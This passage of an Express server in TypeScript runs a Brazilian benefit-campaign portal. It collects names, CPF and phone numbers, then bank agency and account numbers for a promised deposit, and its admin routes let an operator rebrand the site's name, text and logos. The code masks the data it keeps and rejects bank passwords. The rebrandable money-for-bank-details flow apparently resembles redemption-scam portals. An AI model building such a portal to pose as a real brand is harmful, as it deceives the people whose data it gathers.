      res.status(400).json({ error: 'Informe seu nome completo válido (nome e sobrenome).' });
      return;
    }
    if (!isValidCpf(cpfRaw)) {
      res.status(400).json({ error: 'Informe um CPF válido com 11 dígitos.' });
      return;
    }
    if (!isValidBrPhone(phoneRaw)) {
      res.status(400).json({ error: 'Informe um telefone válido com DDD.' });
      return;
    }
    if (!acceptedPrivacy) {
      res.status(400).json({
        error: 'É necessário aceitar o Regulamento da Campanha e a Política de Privacidade (LGPD).',
      });
      return;
    }

    try {
      const claimSecret = getClaimSecret();
      const cpfDigits = onlyDigits(cpfRaw);
      const cpfHash = hashCpf(cpfDigits, claimSecret);
      const cpfMasked = maskCpf(cpfDigits);
      const phoneMasked = maskPhone(phoneRaw);

      const id = crypto.randomUUID();
      const protocol = `CB-${new Date().getFullYear()}-${crypto.randomInt(100000, 999999)}`;
      const referenceCode = `CAM-${crypto.randomInt(100000, 999999)}`;
      const createdAt = new Date().toISOString();

      const outcome = await mutatePortalState<{
        errorStatus?: number;
        errorMessage?: string;
        record?: StoredConsulta;
        alreadyRegistered?: boolean;
      }>((data) => {
        const existing = data.consultas.find((c) => c.cpfHash && c.cpfHash === cpfHash);
        if (existing) {
          if (existing.status === 'troca_solicitada') {
            return {
              nextData: data,
              result: {
                errorStatus: 409,
                errorMessage: `Este CPF já recebeu o benefício da campanha e possui solicitação de resgate registrada (Protocolo ${existing.protocol}).`,
              },
            };
          }
          if (existing.profileLabel.toLowerCase() !== fullName.toLowerCase()) {
            return {
              nextData: data,
              result: {
                errorStatus: 409,
                errorMessage:
                  'Este CPF já possui um cadastro registrado na campanha. Não é possível realizar concessões duplicadas.',
              },
            };
          }
          return {
            nextData: data,
            result: { record: existing, alreadyRegistered: true },
          };
        }

        const record: StoredConsulta = {
          id,
          protocol,
          profileLabel: fullName,
          cpfHash,
          cpfMasked,
          phoneMasked,
          referenceCode,
          pointsAvailable: CAMPAIGN_POINTS_GRANT,
          amountBrl: CAMPAIGN_BRL_VALUE,
          status: 'consultado',
          selectedOptionId: null,
          selectedOptionTitle: null,
          bankLabel: null,
          agencyMasked: null,
          accountMasked: null,
          ownershipConfirmed: false,
          createdAt,
          exchangedAt: null,
        };

        const nextConsultas = [record, ...data.consultas].slice(0, 250);
        return {
          nextData: { ...data, consultas: nextConsultas },
          result: { record, alreadyRegistered: false },
        };
      });

      if (outcome.result.errorStatus) {
        res.status(outcome.result.errorStatus).json({ error: outcome.result.errorMessage });
        return;
      }

      const record = outcome.result.record!;
      const claimToken = signToken({ role: 'claim', consultaId: record.id }, 3600, claimSecret);
      const statusCode = outcome.result.alreadyRegistered ? 200 : 201;

      res
        .status(statusCode)
        .json(toPublicConsultaResult(record, claimToken, Boolean(outcome.result.alreadyRegistered)));
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Etapa 3: Confirmar titularidade e registrar solicitação de depósito em conta corrente (sem senha/código/token)
  app.patch('/api/consultas/:id/trocar', async (req, res) => {
    if (hasForbiddenFinancialFields(req.body)) {
      res.status(400).json({
        error: 'Senhas bancárias, códigos de autenticação, tokens ou dados não permitidos foram rejeitados.',
      });
      return;
    }

    const { id } = req.params;
    const body = (req.body && typeof req.body === 'object' ? req.body : {}) as {
      claimToken?: unknown;
      ownershipConfirmed?: unknown;
      acceptedTerms?: unknown;
      agency?: unknown;
      agencyDigit?: unknown;
      accountNumber?: unknown;
      accountDigit?: unknown;
    };

    if (typeof body.claimToken !== 'string') {
      res.status(400).json({ error: 'Sessão de consulta inválida.' });
      return;
    }
    if (body.ownershipConfirmed !== true || body.acceptedTerms !== true) {
      res.status(400).json({
        error: 'É obrigatório confirmar a titularidade dos dados e concordar com as condições do resgate.',
      });
      return;
    }

    const agency = typeof body.agency === 'string' ? body.agency : '';
    const agencyDigit = typeof body.agencyDigit === 'string' ? body.agencyDigit : '';
    const accountNumber = typeof body.accountNumber === 'string' ? body.accountNumber : '';
    const accountDigit = typeof body.accountDigit === 'string' ? body.accountDigit : '';

    if (!isValidBankAgency(agency)) {
      res.status(400).json({ error: 'Informe um número de agência válido (3 a 5 dígitos).' });
      return;
    }
    if (!isValidOptionalBankDigit(agencyDigit)) {
      res.status(400).json({ error: 'Dígito da agência inválido (use 1 dígito ou X).' });
      return;
    }
    if (!isValidBankAccount(accountNumber)) {
      res.status(400).json({ error: 'Informe um número de conta corrente válido.' });
      return;
    }
    if (!isValidRequiredBankDigit(accountDigit)) {
      res.status(400).json({ error: 'Informe o dígito verificador da conta corrente.' });
      return;
    }

    try {
      const claimSecret = getClaimSecret();
      const tokenData = verifyToken(body.claimToken, claimSecret);
      if (!tokenData || tokenData.role !== 'claim' || tokenData.consultaId !== id) {
        res.status(403).json({
          error: 'Sessão da consulta inválida ou expirada. Realize a consulta novamente.',
        });
        return;
      }

      const maskedAgency = maskBankAgency(agency, agencyDigit);
      const maskedAccount = maskBankAccount(accountNumber, accountDigit);

      const outcome = await mutatePortalState<{
        errorStatus?: number;
        errorMessage?: string;
        record?: StoredConsulta;
      }>((data) => {
        const idx = data.consultas.findIndex((c) => c.id === id);
        if (idx === -1) {
          return {
            nextData: data,
            result: { errorStatus: 404, errorMessage: 'Cadastro não encontrado.' },
          };
        }

        const existing = data.consultas[idx];
        if (existing.status === 'troca_solicitada') {
          return {
            nextData: data,
            result: {
              errorStatus: 409,
              errorMessage: `O resgate para este cadastro já foi solicitado (Protocolo ${existing.protocol}).`,
            },
          };
        }

        const bankLabel = data.settings.redemptionPage?.bankLabel || DEFAULT_REDEMPTION_PAGE.bankLabel;

        const updatedRecord: StoredConsulta = {
          ...existing,
          status: 'troca_solicitada',
          selectedOptionId: SALDO_CONTA_OPTION.id,
          selectedOptionTitle: bankLabel,
          bankLabel,
          agencyMasked: maskedAgency,
          accountMasked: maskedAccount,
          ownershipConfirmed: true,
          exchangedAt: new Date().toISOString(),
        };

        const nextConsultas = [...data.consultas];
        nextConsultas[idx] = updatedRecord;

        return {
          nextData: { ...data, consultas: nextConsultas },
          result: { record: updatedRecord },
        };
      });

      if (outcome.result.errorStatus) {
        res.status(outcome.result.errorStatus).json({ error: outcome.result.errorMessage });
        return;
      }

      const updated = outcome.result.record!;
      res.json(toPublicConsultaResult(updated, body.claimToken, false));
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin login
  app.post('/api/admin/login', async (req, res) => {
    const authCfg = getAdminAuthConfig();
    if (!authCfg.ready) {
      res.status(503).json({ error: authCfg.error });
      return;
    }

    const ip = req.ip || 'unknown';
    if (!checkRateLimit(ip)) {
      res.status(429).json({ error: 'Muitas tentativas incorretas. Aguarde alguns minutos.' });
      return;
    }

    const body = req.body as { passcode?: unknown };
    const passcode = typeof body.passcode === 'string' ? body.passcode.trim() : '';
    if (!passcode) {
      res.status(400).json({ error: 'Informe a senha de acesso.' });
      return;
    }

    try {
      const { data } = await readPortalState();
      if (!verifyPasscode(passcode, data, authCfg.envPasscode)) {
        recordFailedLogin(ip);
        res.status(401).json({ error: 'Senha incorreta. Tente novamente.' });
        return;
      }

      clearLoginAttempts(ip);
      const token = signToken({ role: 'admin' }, 60 * 60 * 8, authCfg.sessionSecret);
      res.json({ token, expiresInSeconds: 60 * 60 * 8 });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin session check
  app.get('/api/admin/verify', requireAdminAuth, (_req, res) => {
    res.json({ authenticated: true });
  });

  // Admin update branding & form settings
  app.put('/api/admin/settings', requireAdminAuth, async (req, res) => {
    const body = req.body as Partial<SiteSettings>;
    if (typeof body.brandName === 'string' && body.brandName.trim().length < 2) {
      res.status(400).json({ error: 'O nome personalizado deve ter pelo menos 2 caracteres.' });
      return;
    }

    try {
      const { data } = await mutatePortalState((current) => {
        const brandName =
          typeof body.brandName === 'string'
            ? body.brandName.trim().slice(0, 60)
            : current.settings.brandName;

        const heroTitle =
          typeof body.heroTitle === 'string' && body.heroTitle.trim().length >= 4
            ? body.heroTitle.trim().slice(0, 120)
            : current.settings.heroTitle;

        const heroSubtitle =
          typeof body.heroSubtitle === 'string' && body.heroSubtitle.trim().length >= 4
            ? body.heroSubtitle.trim().slice(0, 260)
            : current.settings.heroSubtitle;

        const formHeading =
          typeof body.formHeading === 'string' && body.formHeading.trim().length >= 4
            ? body.formHeading.trim().slice(0, 100)
            : current.settings.formHeading;

        const pointsLabel =
          typeof body.pointsLabel === 'string' && body.pointsLabel.trim().length >= 2
            ? body.pointsLabel.trim().slice(0, 40)
            : current.settings.pointsLabel;

        let minPointsPreview = current.settings.minPointsPreview;
        let maxPointsPreview = current.settings.maxPointsPreview;
        if (typeof body.minPointsPreview === 'number' && Number.isFinite(body.minPointsPreview)) {
          minPointsPreview = Math.max(100, Math.min(1000000, Math.round(body.minPointsPreview)));
        }
        if (typeof body.maxPointsPreview === 'number' && Number.isFinite(body.maxPointsPreview)) {
          maxPointsPreview = Math.max(minPointsPreview, Math.min(1000000, Math.round(body.maxPointsPreview)));
        }

        const redemptionPage = body.redemptionPage
          ? sanitizeRedemptionPage(body.redemptionPage, current.settings.redemptionPage)
          : current.settings.redemptionPage;

        const nextData: PortalDataPayload = {
          ...current,
          settings: {
            ...current.settings,
            brandName,
            heroTitle,
            heroSubtitle,
            formHeading,
            pointsLabel,
            minPointsPreview,
            maxPointsPreview,
            redemptionPage,
          },
        };
        return { nextData, result: null };
      });

      res.json(toPublicSettings(data));
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin upload custom logo
  app.post('/api/admin/logo', requireAdminAuth, async (req, res) => {
    const body = req.body as { dataUrl?: unknown };
    if (typeof body.dataUrl !== 'string') {
      res.status(400).json({ error: 'Envie uma imagem válida.' });
      return;
    }

    const match = body.dataUrl.match(/^data:image\/(png|jpeg|jpg|webp);base64,([A-Za-z0-9+/=]+)$/);
    if (!match) {
      res.status(400).json({ error: 'Formato não suportado. Use PNG, JPG ou WEBP.' });
      return;
    }

    const buffer = Buffer.from(match[2], 'base64');
    if (buffer.length === 0 || buffer.length > 1.5 * 1024 * 1024) {
      res.status(400).json({ error: 'A imagem deve ter no máximo 1,5 MB.' });
      return;
    }

    const detected = detectImageType(buffer);
    if (!detected) {
      res.status(400).json({ error: 'Arquivo de imagem inválido ou corrompido.' });
      return;
    }

    try {
      const nextLogo: StoredLogo = {
        mime: detected.mime,
        base64: buffer.toString('base64'),
        revision: Date.now(),
      };

      const { data } = await mutatePortalState((current) => ({
        nextData: { ...current, logo: nextLogo },
        result: null,
      }));

      const publicSettings = toPublicSettings(data);
      res.json({ brandLogoUrl: publicSettings.brandLogoUrl, settings: publicSettings });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin remove custom logo
  app.delete('/api/admin/logo', requireAdminAuth, async (_req, res) => {
    try {
      const { data } = await mutatePortalState((current) => ({
        nextData: { ...current, logo: null },
        result: null,
      }));
      const publicSettings = toPublicSettings(data);
      res.json({ brandLogoUrl: null, settings: publicSettings });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin upload redemption page platform logo
  app.post('/api/admin/redemption-logo', requireAdminAuth, async (req, res) => {
    const body = req.body as { dataUrl?: unknown };
    if (typeof body.dataUrl !== 'string') {
      res.status(400).json({ error: 'Envie uma imagem válida.' });
      return;
    }

    const match = body.dataUrl.match(/^data:image\/(png|jpeg|jpg|webp);base64,([A-Za-z0-9+/=]+)$/);
    if (!match) {
      res.status(400).json({ error: 'Formato não suportado. Use PNG, JPG ou WEBP.' });
      return;
    }

    const buffer = Buffer.from(match[2], 'base64');
    if (buffer.length === 0 || buffer.length > 1.5 * 1024 * 1024) {
      res.status(400).json({ error: 'A imagem deve ter no máximo 1,5 MB.' });
      return;
    }

    const detected = detectImageType(buffer);
    if (!detected) {
      res.status(400).json({ error: 'Arquivo de imagem inválido ou corrompido.' });
      return;
    }

    try {
      const nextLogo: StoredLogo = {
        mime: detected.mime,
        base64: buffer.toString('base64'),
        revision: Date.now(),
      };

      const { data } = await mutatePortalState((current) => ({
        nextData: { ...current, redemptionLogo: nextLogo },
        result: null,
      }));

      const publicSettings = toPublicSettings(data);
      res.json({
        redemptionLogoUrl: publicSettings.redemptionPage.redemptionLogoUrl,
        settings: publicSettings,
      });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin remove redemption page platform logo
  app.delete('/api/admin/redemption-logo', requireAdminAuth, async (_req, res) => {
    try {
      const { data } = await mutatePortalState((current) => ({
        nextData: { ...current, redemptionLogo: null },
        result: null,
      }));
      const publicSettings = toPublicSettings(data);
      res.json({ redemptionLogoUrl: null, settings: publicSettings });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin change passcode (local Node dev only when env passcode is not set)
  app.put('/api/admin/passcode', requireAdminAuth, async (req, res) => {
    const env = options.getEnv();
    if (requiresStrictSecrets() || env.ADMIN_PASSCODE?.trim()) {
      res.status(400).json({
        error: 'A senha é gerenciada pela variável de ambiente ADMIN_PASSCODE em Settings > Secrets.',
      });
      return;
    }

    const body = req.body as { currentPasscode?: unknown; newPasscode?: unknown };
    const currentPasscode = typeof body.currentPasscode === 'string' ? body.currentPasscode.trim() : '';
    const newPasscode = typeof body.newPasscode === 'string' ? body.newPasscode.trim() : '';

    if (newPasscode.length < 4 || newPasscode.length > 64) {
      res.status(400).json({ error: 'A nova senha deve ter entre 4 e 64 caracteres.' });
      return;
    }

    try {
      const outcome = await mutatePortalState<{ ok: boolean }>((current) => {
        if (!verifyPasscode(currentPasscode, current, '')) {
          return { nextData: current, result: { ok: false } };
        }
        return {
          nextData: { ...current, adminPasscodeHash: hashPasscode(newPasscode) },
          result: { ok: true },
        };
      });

      if (!outcome.result.ok) {
        res.status(400).json({ error: 'Senha atual incorreta.' });
        return;
      }

      res.json({ updated: true });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin list consultations (stripped of internal cpfHash)
  app.get('/api/admin/consultas', requireAdminAuth, async (_req, res) => {
    try {
      const { data } = await readPortalState();
      res.json({ consultas: data.consultas.map(toAdminConsulta) });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // Admin delete consultation
  app.delete('/api/admin/consultas/:id', requireAdminAuth, async (req, res) => {
    const { id } = req.params;
    try {
      const outcome = await mutatePortalState<{ deleted: boolean }>((current) => {
        const nextList = current.consultas.filter((c) => c.id !== id);
        if (nextList.length === current.consultas.length) {
          return { nextData: current, result: { deleted: false } };
        }
        return {
          nextData: { ...current, consultas: nextList },
          result: { deleted: true },
        };
      });

      if (!outcome.result.deleted) {
        res.status(404).json({ error: 'Registro não encontrado.' });
        return;
      }

      res.json({ deleted: true });
    } catch (err) {
      sendErrorResponse(res, err);
    }
  });

  // JSON 404 for unmatched /api or /api/* routes
  app.use('/api', (_req, res) => {
    res.status(404).json({ error: 'Rota não encontrada.' });
  });

  return app;
}
